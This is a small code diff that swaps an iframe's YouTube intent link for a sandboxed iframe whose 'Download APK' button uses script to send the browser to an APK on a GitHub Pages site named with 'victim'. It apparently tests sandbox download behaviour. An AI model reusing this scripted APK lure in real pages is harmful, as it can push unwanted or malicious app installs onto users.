@@ -1,5 +1,14 @@
-  <iframe
-    srcdoc="<a href='intent://www.youtube.com/#Intent;scheme=https;package=com.google.android.youtube;S.browser_fallback_url=https%3A%2F%2Fm.youtube.com;end'>Open YouTube app</a>"
-    width="260"
-    height="90">
+<iframe
+    sandbox="allow-scripts allow-downloads"
+    width="280"
+    height="120"
+    srcdoc='
+      <button id="dl">Download APK</button>
+      <script>
+        document.getElementById("dl").onclick = () => {
+          location.href = "https://victimjodyritonga-create.github.io/victim/kocak.apk";
+        };
+      </script>
+    '>
   </iframe>
+
